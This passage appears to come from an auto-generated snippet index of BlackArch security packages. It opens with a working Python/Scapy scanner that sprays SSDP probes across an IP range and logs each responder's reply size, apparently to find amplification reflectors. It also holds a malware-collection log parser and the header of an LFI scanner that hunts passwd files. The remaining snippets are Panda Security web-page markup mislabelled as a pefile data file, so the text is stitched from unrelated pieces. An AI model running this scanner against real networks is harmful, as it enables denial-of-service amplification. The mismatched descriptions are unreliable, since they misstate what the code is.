start = list(map(int, start_ip.split(\".\")))\n    end = list(map(int, end_ip.split(\".\")))\n    temp = start\n    ip_range = []\n\n    ip_range.append(start_ip)\n    while temp != end:\n        start[3] += 1\n        for i in (3, 2, 1):\n            if temp[i] == 256:\n                temp[i] = 0\n                temp[i-1] += 1\n        ip_range.append(\".\".join(map(str, temp)))\n\n    return ip_range\n\nip_range = ipRange(sys.argv[1], sys.argv[2])\n\ndef startscan():\n    total = 0\n    for server in ip_range:\n        sys.stdout.write(\"\\rSent %d Packets | Received %d Packets\" % (total, recv))\n        sys.stdout.flush()\n        packet = IP(dst=server)/UDP(sport=mydestport,dport=1900)/Raw(load=data)\n        send(packet)\n        total = total + 1\n\ndef listen():\n    global recv\n    try:\n        s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))\n    except socket.error , msg:\n        sys.exit()\n\n    while True:\n        packet = s.recvfrom(65565)\n        packet = packet[0]\n\n        eth_length = 14\n\n        eth_header = packet[:eth_length]\n        eth = unpack('!6s6sH' , eth_header)\n        eth_protocol = socket.ntohs(eth[2])\n\n        if eth_protocol == 8:\n            ip_header = packet[eth_length:20+eth_length]\n\n            iph = unpack('!BBHHHBBH4s4s' , ip_header)\n\n            version_ihl = iph[0]\n            version = version_ihl >> 4\n            ihl = version_ihl & 0xF\n\n            iph_length = ihl * 4\n\n            ttl = iph[5]\n            protocol = iph[6]\n            s_addr = socket.inet_ntoa(iph[8]);\n            d_addr = socket.inet_ntoa(iph[9]);\n\n            if protocol == 17 :\n                u = iph_length + eth_length\n                udph_length = 8\n                udp_header = packet[u:u+8]\n\n                udph = unpack('!HHHH' , udp_header)\n\n                source_port = udph[0]\n                dest_port = udph[1]\n                length = udph[2]\n                checksum = udph[3]\n\n                if dest_port == mydestport:\n                    if d_addr == myhost:\n                        list = open(sys.argv[3], 'a')\n                        list.write(\"%s %d\\n\" % (s_addr, length))\n                        recv = recv + 1\n\n                        h_size = eth_length + iph_length + udph_length\n                        data_size = len(packet) - h_size\n\n                        data = packet[h_size:]\n\nif __name__ == '__main__':\n    Thread(target = startscan).start()\n    Thread(target = listen).start()\n\n```\n\n----------------------------------------\n\nTITLE: Initializing Variables, Parsing Options, and Setting Defaults in Perl\nDESCRIPTION: This section initializes script variables, including the archive directory name (`$arch`). It imports necessary Perl modules (`Digest::MD5`, `Getopt::Std`) and parses command-line options using `getopts`. Default values are set for the log file (`$bdscan_log`), report file (`$report_file`), and version (`$VERSION`). Flags like `$debugging`, `$verbose`, `$enable_report`, `$report_only`, and `$process_log_file` are set based on the parsed options or default to 0/false. It checks for the help flag (`-h`) or the mandatory process flag (`-p`) and calls the `usage` subroutine if necessary.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_0\n\nLANGUAGE: perl\nCODE:\n```\n$arch = \"bdvx\";\nuse Digest::MD5;\nuse Getopt::Std;\n%opts=();\ngetopts('vdr:hRpf:F:', \\%opts);\n$VERSION = \"1a\";\n$bdscan_log = \"bdscan.log\" unless $bdscan_log = $opts{f};\n$report_file = \"bdParserReport.txt\" unless $report_file = $opts{F};\nusage() if $opts{h} || !$opts{p};\n$debugging = 0 unless $debugging = $opt{d};\n$verbose = 0 unless $verbose = $opts{v};\n$enable_report = 0 unless $enable_report = $opts{r};\n$report_only = 0 unless $report_only = $opts{R};\n$process_log_file = 0 unless $process_log_file = $opts{p};\n```\n\n----------------------------------------\n\nTITLE: Sorting Subroutine for Malware Count (`by_vx_count`) in Perl\nDESCRIPTION: This is a simple Perl sort subroutine designed to be used with the `sort` function. It compares two elements (`$a` and `$b`) based on their corresponding values in the global hash `%cnt`. The comparison `$cnt{$b} <=> $cnt{$a}` ensures that elements are sorted in descending order based on their counts.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_3\n\nLANGUAGE: perl\nCODE:\n```\nsub by_vx_count { $cnt{$b} <=> $cnt{$a}; }\n```\n\n----------------------------------------\n\nTITLE: Displaying Usage Information (`usage`) in Perl\nDESCRIPTION: This subroutine prints the help message and usage instructions for the script. It uses a Perl heredoc (`<<eof`) to define the multi-line help text. The text includes the script version, author contact information, a brief description of the script's purpose, usage syntax, notes about mandatory options, and detailed descriptions of each command-line option (-h, -d, -v, -r, -F, -R, -p, -f). The default values for the report file (`$report_file`) and log file (`$bdscan_log`) are interpolated into the help text.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/bdlogparser/bdLogParser.txt#_snippet_6\n\nLANGUAGE: perl\nCODE:\n```\nsub usage {\nprint <<eof;\n\\n\\t\\t\\t-$0 Ver: $VERSION-\n\\t\\tBy: magikh0e - <magikh0e\\@ihtb.org>\n\\t\\tHttp://magikh0e.ihtb.org\\n\nThis is a utility to parse a Bit Defender log file, \nin order to sort them into a malware archive for easier \nmaintanence of your malware collection.\n\nUsage:\nNotes: At a minimal, -p must be used. \n       -v or -d must be enabled for reporting features to work.\n\n -h Help. - You are here...\n -d Enable Debugging - turn on debugging\n -v Enable Verbosity - verbose output\n -r Enable Reporting - Creates report/statistics file about scanned files\n -F <file> - Path to report file. Default: $report_file\n -R Report only - process files, but report only. No files are moved.\n -p Process files - copy files from archive into collection directory defined by setting \\$ArcPath\n -f <file> - specifies the path to the F-Prot log file. Default: $bdscan_log-DISABLED\neof\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Modules and Initializing LFI Scanner Banner in Perl\nDESCRIPTION: This snippet imports the `HTTP::Request` and `LWP::UserAgent` modules required for making HTTP requests. It then clears the console screen (using the Windows `cls` command) and prints a banner for the 'Viper LFI Scanner Ver. 3.0', including version information and credits.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_1\n\nLANGUAGE: perl\nCODE:\n```\n    use HTTP::Request;\n    use LWP::UserAgent;\nsystem (\"cls\");\nprint \"\\t\\t/////////////////////////////////////////////////\\n\";    \nprint \"\\t\\t_________________________________________________\\n\";\nprint \"\\t\\t\\t Viper LFI Scanner Ver. 3.0\\n\";\nprint \"\\t\\t\\t Coded By Bl4ck.Viper\\n\";\nprint \"\\t\\t\\t Made In Azarbycan\\n\";\nprint \"\\t\\t\\t Version In English\\n\";\nprint \"\\t\\t_________________________________________________\\n\";\nprint \"\\n\\n\";\nsleep (1);\nprint \"\\t\\t\\t\\t WELCOME\\n\";\nprint \"\\n\\n\";\n```\n\n----------------------------------------\n\nTITLE: Running the Viper LFI Scanner Perl Script\nDESCRIPTION: This snippet shows the beginning of the Viper LFI Scanner version 4.0, written in Perl. It includes the shebang line (`#!/usr/bin/perl`) specifying the interpreter, followed by extensive comments providing metadata about the script: its title, author (Bl4ck.Viper), origin (Azarbycan), date, category (Scanner), homepage, contact emails, and a description of its functionality (scanning for LFI vulnerabilities related to log, environment, and password files, including bypass methods).\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/lfi-scanner/lfi-scanner-ver4.0.pl.txt#_snippet_0\n\nLANGUAGE: perl\nCODE:\n```\n#!/usr/bin/perl\n#\n#\t\t\t\t////////////////////////////////////\n#\t\t\t\t\tViper LFI Scanner Ver. 4.0\n#\t\t\t\t////////////////////////////////////\n#\n#\tTitle : Viper Lfi Scanner Ver. 4.0\n#\tAuthor: Bl4ck.Viper\n#\tFrom : Azarbycan\n#\tDate : 2011/07/06\n#\tCategory : Scanner\n#\tHome : www.Skote-vahshat.com\n#\tEmails : Bl4ck.Viper@Yahoo.com , Bl4ck.Viper@Hotmail.com , Bl4ck.Viper@Gmail.com\n#\t\n#\n#\tDescription :Log , Environ , Passwd File Scanner ,& new method for bypass passwd\n#\t\t\t\t\t\t           \n```\n\n----------------------------------------\n\nTITLE: Initializing Google Tag Manager Asynchronously in JavaScript\nDESCRIPTION: This JavaScript snippet initializes Google Tag Manager (GTM). It asynchronously loads the GTM script using the provided container ID ('GTM-W9FHGT'). This allows for website analytics and tag management without blocking page rendering. It relies on the standard browser 'window', 'document', and 'script' objects.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':\nnew Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],\nj=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=\n'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);\n})(window,document,'script','dataLayer','GTM-W9FHGT');\n```\n\n----------------------------------------\n\nTITLE: Initializing Google Tag Manager (GTM) in JavaScript\nDESCRIPTION: This JavaScript snippet, placed near the beginning of the `<body>` tag, initializes Google Tag Manager (GTM). It creates the `dataLayer` array if needed, pushes the initial `gtm.start` event with a timestamp, and asynchronously loads the GTM container script (`gtm.js`) associated with the ID `GTM-W9FHGT`. The accompanying `<noscript>` tag provides an iframe-based fallback mechanism for tracking users with JavaScript disabled.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<noscript><iframe src=\"//www.googletagmanager.com/ns.html?id=GTM-W9FHGT\" height=\"0\" width=\"0\" style=\"display:none;visibility:hidden\"></iframe></noscript>\n```\n\nLANGUAGE: javascript\nCODE:\n```\n<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':\n\tnew Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],\n\tj=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=\n\t'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);\n})(window,document,'script','dataLayer','GTM-W9FHGT');</script>\n```\n\n----------------------------------------\n\nTITLE: Defining Website Schema with JSON-LD\nDESCRIPTION: This snippet uses JSON-LD (JavaScript Object Notation for Linked Data) embedded within the HTML `<head>` to provide structured data about the website according to schema.org vocabulary. It defines the entity as a `WebSite`, specifies its `url`, and outlines a `potentialAction` for site search, enabling search engines to better understand the site and potentially display a sitelinks search box.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n<script type=\"application/ld+json\">{ \"@context\": \"http://schema.org\", \"@type\": \"WebSite\", \"url\": \"http://www.pandasecurity.com/mediacenter/\", \"potentialAction\": { \"@type\": \"SearchAction\", \"target\": \"http://www.pandasecurity.com/mediacenter/?s={search_term}\", \"query-input\": \"required name=search_term\" } }</script>\n```\n\n----------------------------------------\n\nTITLE: Defining WordPress AJAX URL in JavaScript\nDESCRIPTION: This inline JavaScript snippet defines a global object `themeajax`. This object contains a property `url` which holds the absolute URL to the WordPress `admin-ajax.php` file. This is a common practice in WordPress development to make the AJAX endpoint available for frontend JavaScript interactions.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n/* <![CDATA[ */\nvar themeajax = {\"url\":\"http:\\/\\/mediacenter.pandasecurity.com\\/mediacenter\\/wp-admin\\/admin-ajax.php\"};\n/* ]]> */\n```\n\n----------------------------------------\n\nTITLE: Configuring Contact Form 7 Plugin Settings in JavaScript\nDESCRIPTION: This inline JavaScript snippet defines a global object `_wpcf7`. This object holds configuration settings for the Contact Form 7 WordPress plugin. It specifies the URL for the loading indicator GIF (`loaderUrl`), the message displayed during submission (`sending`), and a caching flag (`cached`). These settings are used by the Contact Form 7 JavaScript included earlier.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n/* <![CDATA[ */\nvar _wpcf7 = {\"loaderUrl\":\"http:\\/\\/mediacenter.pandasecurity.com\\/mediacenter\\/wp-content\\/plugins\\/contact-form-7\\/images\\/ajax-loader.gif\",\"sending\":\"Sending ...\",\"cached\":\"1\"};\n/* ]]> */\n```\n\n----------------------------------------\n\nTITLE: Defining AdRotate Pro Click Tracker URL in JavaScript\nDESCRIPTION: This inline JavaScript snippet declares a global variable `tracker_url`. It assigns the URL of the click tracking script (`clicktracker.php`) provided by the AdRotate Pro WordPress plugin. This variable is likely used by the AdRotate click tracking JavaScript (`jquery.adrotate.clicktracker.js`) included earlier to report ad clicks.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nvar tracker_url = 'http://mediacenter.pandasecurity.com/mediacenter/wp-content/plugins/adrotate-pro/library/clicktracker.php';\n```\n\n----------------------------------------\n\nTITLE: Hiding an Element with jQuery Animation on Click in JavaScript\nDESCRIPTION: This inline JavaScript snippet, triggered by an 'onclick' event on an anchor tag (`<a class=\"close\">`), uses the jQuery library to animate the height of the HTML element with the ID 'breaking' to 0. This effectively hides the element smoothly. It requires the jQuery library to be loaded previously and depends on the presence of an element with id 'breaking'. `return false;` prevents the default anchor click behavior.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\njQuery('#breaking').animate({ height: 0}); return false;\n```\n\n----------------------------------------\n\nTITLE: Defining HTML Layout for Panda Security News Articles\nDESCRIPTION: This HTML snippet defines the structure for displaying multiple news articles related to Panda Security. It uses `article` tags for each post, nested within `div` elements styled with CSS classes (e.g., `row`, `five columns`, `seven columns`) likely for a grid layout. Each article includes an image (`<img>`), a category link (`<a>` within `<aside>`), a title (`<h2>`), a short description (`<p>`), and metadata (`<aside class=\"post-meta\">`) such as publication date, like count, and comment count link. It also includes a \"Load More\" button (`<a id=\"loadmore\">`) and a section dedicated to \"Panda Security\" articles specifically.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\nmmentcount\"  title=\"Comment on BlackBerry Messenger. The app that lets you chat only to those you want to.\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div></div></div> </article> <article class=\"post\"><div class=\"row\"><div class=\"five columns\"><div class=\"post-gallery\"> <a href=\"http://www.pandasecurity.com/mediacenter/malware/airhopper-malware-infects-corporate-network-even-though-connected-internet/\" rel=\"bookmark\"><img width=\"284\" height=\"190\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/12/disconnected-computer-284x190.jpg\" class=\"attachment-recent wp-post-image\" alt=\"disconnected-computer\" /></a></div></div><div class=\"seven columns\"><div class=\"post-title\"> <aside><a href=\"http://www.pandasecurity.com/mediacenter/category/malware/\" title=\"Malware\" style=\"color:#34495e;\">Malware</a></aside><h2><a href=\"http://www.pandasecurity.com/mediacenter/malware/airhopper-malware-infects-corporate-network-even-though-connected-internet/\" rel=\"bookmark\">AirHopper, the malware that infects your corporate network even though you are not connected to the Internet</a></h2></div><div class=\"post-content\"><p>Seems logical, doesn&#8217;t it? If your company has ever warned you that you must tread very carefully when browsing the Internet so that your...</p> <aside class=\"post-meta\"><ul><li>Dec 1, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12625\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">1</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/malware/airhopper-malware-infects-corporate-network-even-though-connected-internet/#respond\" class=\"postcommentcount\"  title=\"Comment on AirHopper, the malware that infects your corporate network even though you are not connected to the Internet\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div></div></div> </article> <article class=\"post\"><div class=\"row\"><div class=\"five columns\"><div class=\"post-gallery\"> <a href=\"http://www.pandasecurity.com/mediacenter/security/international-computer-security-day/\" rel=\"bookmark\"><img width=\"284\" height=\"190\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/11/international-computer-security-284x190.jpg\" class=\"attachment-recent wp-post-image\" alt=\"International Computer Security Day\" /></a></div></div><div class=\"seven columns\"><div class=\"post-title\"> <aside><a href=\"http://www.pandasecurity.com/mediacenter/category/security/\" title=\"Internet Security\" style=\"color:#3498db;\">Internet Security</a></aside><h2><a href=\"http://www.pandasecurity.com/mediacenter/security/international-computer-security-day/\" rel=\"bookmark\">5 Tips for secure browsing on International Computer Security Day</a></h2></div><div class=\"post-content\"><p>Next Sunday, November 30, is International Computer Security Day. As we do not want you to get caught off guard, we give you 5 tips for secure...</p> <aside class=\"post-meta\"><ul><li>Nov 28, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12621\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">2</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/security/international-computer-security-day/#respond\" class=\"postcommentcount\"  title=\"Comment on 5 Tips for secure browsing on International Computer Security Day\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div></div></div> </article> <article class=\"post\"><div class=\"row\"><div class=\"five columns\"><div class=\"post-gallery\"> <a href=\"http://www.pandasecurity.com/mediacenter/news/panda-internet-security-2015-achieves-virus-bulletin-certification/\" rel=\"bookmark\"><img width=\"284\" height=\"190\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2013/09/virusbulletin-284x190.jpg\" class=\"attachment-recent wp-post-image\" alt=\"Virus Bulletin\" /></a></div></div><div class=\"seven columns\"><div class=\"post-title\"> <aside><a href=\"http://www.pandasecurity.com/mediacenter/category/news/\" title=\"News\" style=\"color:#e74c3c;\">News</a></aside><h2><a href=\"http://www.pandasecurity.com/mediacenter/news/panda-internet-security-2015-achieves-virus-bulletin-certification/\" rel=\"bookmark\">Panda Internet Security 2015 achieves Virus Bulletin certification</a></h2></div><div class=\"post-content\"><p>Congratulations are in order! Panda Internet Security 2015 has achieved Virus Bulletin certification! In addition to this good news in itself, we...</p> <aside class=\"post-meta\"><ul><li>Nov 27, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12618\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">1</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/news/panda-internet-security-2015-achieves-virus-bulletin-certification/#respond\" class=\"postcommentcount\"  title=\"Comment on Panda Internet Security 2015 achieves Virus Bulletin certification\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div></div></div> </article> <article class=\"post\"><div class=\"row\"><div class=\"five columns\"><div class=\"post-gallery\"> <a href=\"http://www.pandasecurity.com/mediacenter/press-releases/panda-security-launches-panda-cloud-office-protection-7-1/\" rel=\"bookmark\"><img width=\"284\" height=\"190\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/11/PCOP-7.1_EN-284x190.png\" class=\"attachment-recent wp-post-image\" alt=\"PCOP 7.1_EN\" /></a></div></div><div class=\"seven columns\"><div class=\"post-title\"> <aside><a href=\"http://www.pandasecurity.com/mediacenter/category/press-releases/\" title=\"Press Releases\" style=\"color:#222;\">Press Releases</a></aside><h2><a href=\"http://www.pandasecurity.com/mediacenter/press-releases/panda-security-launches-panda-cloud-office-protection-7-1/\" rel=\"bookmark\">Panda Security launches Panda Cloud Office Protection 7.1</a></h2></div><div class=\"post-content\"><p>Panda Security, The Cloud Security Company, announces the new features of version 7.1 of Panda Cloud Office Protection (PCOP), Panda Security&#8217;s...</p> <aside class=\"post-meta\"><ul><li>Nov 26, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12614\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">1</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/press-releases/panda-security-launches-panda-cloud-office-protection-7-1/#respond\" class=\"postcommentcount\"  title=\"Comment on Panda Security launches Panda Cloud Office Protection 7.1\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div></div></div> </article> <a id=\"loadmore\" href=\"#\" data-loading=\"Loading ...\" data-nomore=\"No More Posts to Show\" data-count=\"5\" data-action=\"thb_ajax_home\">Load More</a> </section> <section class=\"categorynews\"><div class=\"categoryholder cf\"><div class=\"categoryheadline\" style=\"border-color:#17b3e6\"><h2>Panda Security</h2> <span><a href=\"http://www.pandasecurity.com/mediacenter/category/panda-security/\" style=\"color:#17b3e6\"><i class=\"icon-long-arrow-right\"></i> View All Articles</a></span></div><div class=\"row\"> <article class=\"post five columns\"><div class=\"post-gallery\"> <a href=\"http://www.pandasecurity.com/mediacenter/panda-security/presentation-2015-consumer-antivirus-solutions/\" rel=\"bookmark\"><img width=\"284\" height=\"190\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/09/Panda-2015-team-284x190.jpeg\" class=\"attachment-recent wp-post-image\" alt=\"Panda 2015 team\" /></a></div><div class=\"post-title\"><h2><a href=\"http://www.pandasecurity.com/mediacenter/panda-security/presentation-2015-consumer-antivirus-solutions/\" rel=\"bookmark\">Presentation of the 2015 Consumer Antivirus Solutions</a></h2></div><div class=\"post-content\"><p>Today is not just another Monday! Aching muscles, photos in red jumpsuits, exciting stories… What are we talking about? About the presentation of...</p> <aside class=\"post-meta\"><ul><li>Sep 22, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12261\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">0</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/panda-security/presentation-2015-consumer-antivirus-solutions/#respond\" class=\"postcommentcount\"  title=\"Comment on Presentation of the 2015 Consumer Antivirus Solutions\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div> </article><div class=\"seven columns\"> <article class=\"post cf side\"><div class=\"post-gallery mobile-one left\"> <a href=\"http://www.pandasecurity.com/mediacenter/panda-security/avoid-captcha/\" rel=\"bookmark\"><img width=\"110\" height=\"80\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/09/avoid-captcha-110x80.jpg\" class=\"attachment-post-thumbnail wp-post-image\" alt=\"avoid captcha\" /></a></div><div class=\"post-title mobile-three left\"><h2><a href=\"http://www.pandasecurity.com/mediacenter/panda-security/avoid-captcha/\" rel=\"bookmark\">Fed up with CAPTCHA? How to avoid it?</a></h2> <aside class=\"post-meta\"><ul><li>Sep 15, 2014</li><li>&bull; <a href=\"#\" class=\"likeThis\" data-id=\"12230\"> <i class=\"fa fa-heart-o\"></i> <span class=\"count\">2</span> </a></li><li>&bull; <a href=\"http://www.pandasecurity.com/mediacenter/panda-security/avoid-captcha/#respond\" class=\"postcommentcount\"  title=\"Comment on Fed up with CAPTCHA? How to avoid it?\"><i class=\"fa fa-comment-o\"></i> 0</a></li></ul></aside></div> </article></div><div class=\"seven columns\"> <article class=\"post cf side\"><div class=\"post-gallery mobile-one left\"> <a href=\"http://www.pandasecurity.com/mediacenter/panda-security/panda-cloud-antivirus-free-now-panda-free-antivirus/\" rel=\"bookmark\"><img width=\"110\" height=\"80\" src=\"http://mediacenter.pandasecurity.com/mediacenter/wp-content/uploads/2014/08/free-110x80.jpg\" class=\"attachment-post-thumbnail wp-post-image\" alt=\"free\" /></a></div><div class=\"post-title mobile-three left\"><h2><a href=\"http://www.pandasecurity.com/mediacenter/panda-security/panda-cloud-antivirus-free-now-panda-free-antivirus/\" rel=\"bookmark\">Panda Cloud Antivirus FREE is now Panda Free Antiviru\n```\n\n----------------------------------------\n\nTITLE: Displaying Recent Security Articles and Metadata - HTML\nDESCRIPTION: This HTML snippet is responsible for structuring and displaying recent articles in the security domain, including elements such as images, headlines, publishing dates, like counters, and comment counts. It makes extensive use of CSS classes for layout (e.g., columns, sidebars) and semantic tags for better readability and SEO. No special client-side or server-side dependencies are present except for assumed CSS and icon/font assets; content is static and parameters such as 'data-id' for likes or comment metadata are encoded as HTML attributes for integration with additional JavaScript on the main site.\nSOURCE: https://github.com/blackarch/blackarch/blob/master/packages/python2-pefile/userdb.txt#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<aside class=\\\"post-meta\\\"><ul><li>Aug 14, 2014</li><li>&bull; <a href=\\\"#\\\" class=\\\"likeThis\\\" data-id=\\\"12002\\\"> <i class=\\\"fa fa-heart-o\\\"></i> <span class=\\\"count\\\">31</span> </a></li><li>&bull; <a href=\\\"http://www.pandasecurity.com/mediacenter/panda-security/panda-cloud-antivirus-free-now-panda-free-antivirus/#comments\\\" class=\\\"postcommentcount\\\"  title=\\\"Comment on Panda Cloud Antivirus FREE is now Panda Free Antivirus!\\\"><i class=\\\"fa fa-comment-o\\\"></i> 24</a></li></ul></aside>...</div>\n```"
  }
]